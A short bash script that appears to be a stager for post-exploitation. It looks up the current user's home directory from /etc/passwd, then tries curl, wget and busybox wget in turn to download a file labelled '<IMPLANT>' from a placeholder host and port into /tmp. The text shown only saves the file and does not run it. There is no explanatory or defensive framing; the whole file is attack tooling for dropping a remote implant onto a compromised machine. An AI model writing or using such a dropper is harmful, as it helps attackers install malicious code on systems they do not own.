#!/bin/bash

get_home() {
    local user="${1:-$USER}"

    awk -F: -v user="$user" '
        $1 == user {
            print $6
            exit
        }
    ' /etc/passwd
}

USER=$(id -un)
HOME=$(get_home "$USER")

url="http://<HOST>:<PORT>/<IMPLANT>"
out="/tmp/<IMPLANT>"

for cmd in curl wget "busybox wget"; do
    case "$cmd" in
        curl)
            command -v curl >/dev/null 2>&1 &&
            curl -fsSL "$url" -o "$out" && break
            ;;
        wget)
            command -v wget >/dev/null 2>&1 &&
            wget -qO "$out" "$url" && break
            ;;
        "busybox wget")
            command -v busybox >/dev/null 2>&1 &&
            busybox wget -qO "$out" "$url" && break
            ;;
    esac
done
